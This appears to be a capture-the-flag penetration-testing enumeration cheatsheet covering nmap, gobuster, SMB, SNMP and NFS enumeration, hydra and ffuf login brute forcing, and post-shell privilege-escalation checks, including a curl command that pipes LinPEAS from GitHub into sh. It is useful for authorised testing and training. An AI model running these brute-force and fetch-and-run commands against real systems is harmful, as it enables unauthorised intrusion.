# Enumeration Cheatsheet

Run these in order on every box. Don't skip ahead until each step gives you something to work with.

---

## 1. Nmap

```bash
# Fast full port scan first — don't miss anything on a weird port
nmap -p- -T4 --min-rate 5000 <IP> -oN ports.txt

# Then deep scan only the open ports
nmap -p <ports> -sV -sC -A <IP> -oN detailed.txt
```

```bash
# Your standard go-to scan
nmap -sC -sV -oN initial.txt <ip>

# Full port scan (don't skip this)
nmap -p- --min-rate 5000 -oN allports.txt <ip>

# Then focused scan on discovered ports
nmap -sC -sV -p 80,443,8080 -oN targeted.txt <ip>

# UDP (slow, but some boxes need it)
nmap -sU --top-ports 20 <ip>

# OS detection (occasionally useful)
nmap -O <ip>
```

**Flags worth knowing:**

- `-sC` — default scripts
- `-sV` — version detection
- `-p-` — all ports
- `-oN` / `-oA` — output (oA saves all formats at once)
- `--min-rate` — speed up scans
- `-T4` — timing template (some people use this instead of min-rate)
- `-Pn` — skip host discovery (use when host seems down but isn't)
- `-sU` — UDP scan
- `-sS` — SYN scan (default when root, stealthier)

> Always save output with `-oN`. You'll want to grep it later.

---

## 2. Web (port 80 / 443 / 8080)

```bash
# Directory brute force
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

# Bigger wordlist if common.txt finds nothing
# can add jpg,png
gobuster dir -u http://<IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt

# Check for subdomains if you have a hostname
gobuster vhost -u http://<hostname> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Nikto — quick vuln scan
nikto -h http://<IP>
```

`gobuster dir -u http://10.114.148.234 -w /usr/share/wordlists/dirb/common.txt -x txt,html,php`
`curl -s http://10.112.155.219/n0th1ng3ls3m4tt3r/ | less`

Always:
- View page source (`Ctrl+U`)
- Check `/robots.txt` and `/sitemap.xml` manually
- Look at cookies and response headers in Burp or browser devtools

---

## 3. SMB (port 139 / 445)

```bash
# List shares anonymously
smbclient -L //<IP> -N

# Enumerate everything (users, shares, OS info)
enum4linux -a <IP>

# Check for known vulns (EternalBlue etc.)
nmap -p 445 --script smb-vuln* <IP>

# Connect to a share
smbclient //<IP>/<share> -N
smbclient //<IP>/<share> -U <user>
```

---

## 4. FTP (port 21)

```bash
# Try anonymous login
ftp <IP>
# username: anonymous  password: (blank or anonymous@)

# Or
nmap -p 21 --script ftp-anon <IP>
```

---

## 5. SSH (port 22)

```bash
# Check version (look up CVEs if old)
ssh <IP>

# Brute force if you have a username
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4 -V -f
```

---

## 6. DNS (port 53)

```bash
# Zone transfer attempt
dig axfr @<IP> <domain>

# Reverse lookup
nmap -p 53 --script dns-zone-transfer <IP>
```

---

## 7. SNMP (port 161 UDP)

```bash
# Often missed — nmap default scans don't hit UDP
nmap -sU -p 161 <IP>

# Enumerate community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# Walk the MIB tree
snmpwalk -v2c -c public <IP>
```

---

## 8. NFS (port 2049)

```bash
# List exports
showmount -e <IP>

# Mount a share
mount -t nfs <IP>:/share /mnt/nfs
```

---

## 9. General Username / Password Hunting

```bash
# Brute force a web login form
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Username enumeration (web)
# Use ffuf or burp intruder with a username wordlist
ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&password=x" -u http://<IP>/login -H "Content-Type: application/x-www-form-urlencoded" -mr "Invalid username"
```

---

## 10. After You Get a Shell

```bash
# Who are you and where are you
id
whoami
hostname
uname -a
cat /etc/os-release

# What can you do
sudo -l
cat /etc/crontab
crontab -l

# SUID binaries
find / -perm -4000 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Run LinPEAS immediately
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

---

## Port → Service Quick Reference

| Port | Service | First thing to try |
|------|---------|-------------------|
| 21 | FTP | Anonymous login |
| 22 | SSH | Version → CVE, brute force if you have a user |
| 25 | SMTP | User enumeration (`VRFY`, `EXPN`) |
| 53 | DNS | Zone transfer |
| 80/443 | HTTP | Gobuster, Nikto, page source |
| 110 | POP3 | Login with found creds |
| 139/445 | SMB | Null session, enum4linux |
| 161 | SNMP | Community string brute force |
| 2049 | NFS | showmount, mount and browse |
| 3306 | MySQL | Login with found creds, `root` no password |
| 3389 | RDP | Brute force, check for BlueKeep |
| 5985 | WinRM | Evil-WinRM with creds |
| 8080 | HTTP alt | Same as 80 — check for Tomcat, Jenkins |
